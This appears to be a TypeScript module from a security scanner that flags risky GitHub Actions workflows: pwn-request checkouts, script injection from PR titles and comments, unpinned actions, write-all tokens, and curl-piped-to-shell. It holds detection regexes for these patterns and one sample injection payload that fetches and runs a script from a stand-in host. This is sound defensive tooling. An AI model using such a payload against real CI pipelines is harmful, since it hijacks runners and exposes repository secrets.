import type { Finding, Severity, SecurityContext } from "../types";
import { fingerprint } from "../util";

const WORKFLOW = /^\.github\/workflows\/[^/]+\.ya?ml$/;

/** Context values an outsider controls (PR titles, branch names, comment bodies…). Interpolated into a shell script they become code. */
const TAINTED = /\$\{\{\s*(?:github\.event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.(?:ref|label|repo\.default_branch))|comment\.body|review\.body|review_comment\.body|discussion\.(?:title|body)|head_commit\.message|head_commit\.author\.(?:name|email)|commits\[[^\]]*\]\.message|pages\[[^\]]*\]\.page_name)|github\.head_ref)\s*\}\}/;

interface Hit { ruleId: string; severity: Severity; title: string; line: number; reason: string; fix: string; cwe: string[]; owasp?: string; key: string; confidence?: "high" | "medium" | "low" }

const indentOf = (l: string) => l.length - l.trimStart().length;
const OWNED_BY_GITHUB = /^(?:actions|github)\//;

/** Heuristic, line-based: it is how we can say exactly WHICH line. It reads YAML structure just enough (run blocks, uses, triggers). */
export function scanWorkflow(text: string): Hit[] {
  const lines = text.split("\n");
  const hits: Hit[] = [];
  const triggers = /^\s*(?:on:|"on":)/m.test(text) ? text : "";
  const hasPRT = /\bpull_request_target\b/.test(triggers);
  const hasPermissions = /^permissions:/m.test(text) || /^\s{4,}permissions:/m.test(text);

  // 1) the dangerous trio: pull_request_target + checking out the PR's code (a "pwn request")
  if (hasPRT) {
    const trig = lines.findIndex((l) => /\bpull_request_target\b/.test(l)) + 1;
    const checkoutHead = lines.findIndex((l, i) => /ref:\s*\$\{\{\s*github\.(?:event\.pull_request\.head\.(?:sha|ref)|head_ref)\s*\}\}/.test(l) && /checkout/.test(lines.slice(Math.max(0, i - 6), i).join("\n")));
    if (checkoutHead >= 0) {
      hits.push({ ruleId: "GHA/pwn-request", severity: "critical", title: "pull_request_target checks out untrusted pull-request code", line: checkoutHead + 1, key: "prt-checkout",
        reason: "This workflow runs with the repository's secrets and a write token, yet checks out code from the pull request. Anyone who can open a PR can make it run their code with those privileges.",
        fix: "Do not check out the PR head in a pull_request_target workflow. Use the `pull_request` trigger for building PR code, or split into an unprivileged build and a separate privileged step that never runs PR code.", cwe: ["CWE-94", "CWE-829"], owasp: "A08:2021 Software and Data Integrity Failures" });
    } else {
      hits.push({ ruleId: "GHA/pull-request-target", severity: "low", title: "Workflow uses pull_request_target", line: trig, key: "prt", confidence: "medium",
        reason: "pull_request_target runs with secrets and a write token even for pull requests from forks. It is safe only if nothing in it runs code from the PR.",
        fix: "Confirm no step builds, tests or executes pull-request code. Prefer `pull_request` when you do not need secrets.", cwe: ["CWE-829"] });
    }
  }

  // 2) expression injection: attacker-controlled text interpolated into a run: script
  let runIndent = -1;
  for (let i = 0; i < lines.length; i++) {
    const l = lines[i];
    if (runIndent >= 0 && l.trim() && indentOf(l) <= runIndent) runIndent = -1;
    const m = /^(\s*)(?:-\s+)?run:\s*(.*)$/.exec(l);
    if (m) {
      runIndent = indentOf(l) + (l.trimStart().startsWith("-") ? 2 : 0);
      if (m[2] && !/^[|>][-+]?\s*$/.test(m[2])) { // inline script on the same line
        if (TAINTED.test(m[2])) hits.push(inject(i + 1, m[2]));
        runIndent = -1;
      }
      continue;
    }
    if (runIndent >= 0 && TAINTED.test(l)) hits.push(inject(i + 1, l));
  }

  // 3) actions pinned to a moving tag/branch instead of a commit
  for (let i = 0; i < lines.length; i++) {
    const m = /^\s*(?:-\s+)?uses:\s*([^\s#]+)/.exec(lines[i]);
    if (!m) continue;
    const ref = m[1];
    if (ref.startsWith("./") || ref.startsWith("docker://")) continue;
    const [name, rev = ""] = ref.split("@");
    if (/^[0-9a-f]{40}$/.test(rev)) continue;
    const official = OWNED_BY_GITHUB.test(name);
    hits.push({ ruleId: "GHA/unpinned-action", severity: official ? "low" : "medium", title: `${name} is not pinned to a commit`, line: i + 1, key: `unpinned:${name}@${rev}`,
      reason: `\`${ref}\` points at a tag or branch, which its owner (or an attacker who takes over their account) can move to malicious code. Your pipeline would run it with your secrets${official ? ". GitHub's own actions are lower risk." : "."}`,
      fix: `Pin it to the full commit SHA of the version you reviewed (\`${name}@<40-char sha> # ${rev || "v1"}\`). Dependabot can keep pinned SHAs up to date.`, cwe: ["CWE-829"], owasp: "A08:2021 Software and Data Integrity Failures", confidence: "high" });
  }

  // 4) token permissions
  const wa = lines.findIndex((l) => /^\s*permissions:\s*write-all\b/.test(l));
  if (wa >= 0) hits.push({ ruleId: "GHA/write-all", severity: "medium", title: "Workflow token has write access to everything", line: wa + 1, key: "write-all",
    reason: "`permissions: write-all` hands every step a token that can change code, releases, packages and more. A compromised step or action can use all of it.",
    fix: "Declare the least privilege needed, for example `permissions: { contents: read }`, and grant more per job only where required.", cwe: ["CWE-250"], owasp: "A01:2021 Broken Access Control" });
  else if (!hasPermissions) hits.push({ ruleId: "GHA/no-permissions", severity: "low", title: "Workflow does not restrict its token permissions", line: Math.max(1, lines.findIndex((l) => /^\s*jobs:/.test(l)) + 1), key: "no-permissions", confidence: "medium",
    reason: "With no `permissions:` block the token gets the repository's default, which for older repositories is read and write.",
    fix: "Add `permissions: { contents: read }` at the top of the workflow and widen it per job only when needed.", cwe: ["CWE-250"] });

  // 5) piping the internet into a shell
  for (let i = 0; i < lines.length; i++) {
    if (/\b(?:curl|wget)\b[^|\n]*\|\s*(?:sudo\s+)?(?:ba|z)?sh\b/.test(lines[i])) {
      hits.push({ ruleId: "GHA/curl-pipe-shell", severity: "medium", title: "Downloads a script and runs it unverified", line: i + 1, key: `curlsh:${lines[i].trim()}`,
        reason: "Whatever the server returns is executed immediately with the job's secrets. If that host is compromised or the URL is hijacked, so is your pipeline.",
        fix: "Download to a file, verify a pinned checksum or signature, then run it. Or install from a package manager at a pinned version.", cwe: ["CWE-494"], owasp: "A08:2021 Software and Data Integrity Failures" });
    }
  }
  return hits;

  function inject(line: number, src: string): Hit {
    const expr = TAINTED.exec(src)?.[0] ?? "";
    return { ruleId: "GHA/script-injection", severity: "high", title: "Untrusted input is pasted into a shell script", line, key: `inject:${expr}`,
      reason: `\`${expr}\` is text an outsider controls (a title, branch name or comment). Because it is interpolated into the script before the shell runs, a value like \`"; curl evil.sh | sh #\` becomes commands on your runner, with your secrets.`,
      fix: "Pass it through an environment variable and read it as a normal shell variable: `env: { TITLE: ${{ github.event.pull_request.title }} }` then use `\"$TITLE\"` in the script.", cwe: ["CWE-94", "CWE-77"], owasp: "A03:2021 Injection" };
  }
}

export async function analyzePipelines(ctx: SecurityContext): Promise<Finding[]> {
  const out: Finding[] = [];
  for (const path of ctx.files.filter((f) => WORKFLOW.test(f))) {
    const text = await ctx.read(path);
    if (!text) continue;
    const merged = new Map<string, Finding>();
    for (const h of scanWorkflow(text)) {
      const id = fingerprint("pipeline", path, h.ruleId, h.key);
      const prev = merged.get(id);
      if (prev) { prev.detail.lines = [...(prev.detail.lines ?? [prev.line!]), h.line]; continue; } // same issue repeated: one finding, every line
      merged.set(id, { id, ruleId: h.ruleId, category: "pipeline", severity: h.severity, title: h.title, path, line: h.line, reason: h.reason, fix: h.fix, cwe: h.cwe, owasp: h.owasp, confidence: h.confidence ?? "high", detail: {} });
    }
    out.push(...merged.values());
  }
  return out;
}
